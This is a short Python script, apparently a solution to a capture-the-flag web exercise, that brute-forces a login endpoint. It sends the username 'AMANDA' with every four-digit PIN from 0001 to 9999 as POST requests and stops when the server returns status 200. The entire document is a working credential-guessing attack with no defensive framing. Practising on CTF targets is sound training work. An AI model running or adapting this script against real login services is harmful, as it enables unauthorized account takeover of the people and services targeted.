import requests

url = "https://ctfwebtest.onrender.com/login"
nome = "AMANDA"

for senha in range(1, 10000):
    senha = f"{senha:04d}"

    dados = {
        "nome" : nome,
        "senha" : senha
    }

    resposta = requests.post(url, json=dados)

    print(resposta)

    print (nome, senha, resposta.status_code)

    if resposta.status_code == 200:
        print("ACHOU!")
        print(resposta.json())
        break